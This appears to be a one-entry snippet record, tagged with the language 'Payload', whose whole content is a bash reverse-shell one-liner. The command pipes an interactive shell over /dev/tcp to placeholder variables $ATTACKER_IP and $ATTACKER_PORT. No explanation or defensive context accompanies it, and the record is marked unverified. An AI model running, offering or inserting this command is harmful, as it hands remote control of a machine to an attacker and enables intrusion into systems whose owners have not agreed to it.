---
id: 7dac1dc9-1e21-46d9-8665-cf90b2c56240
type: code
language: Payload
verified: false
created_at: '2020-03-16T07:57:30.019809+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 7dac1dc9

**Language**: Payload

```payload
/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1'
```
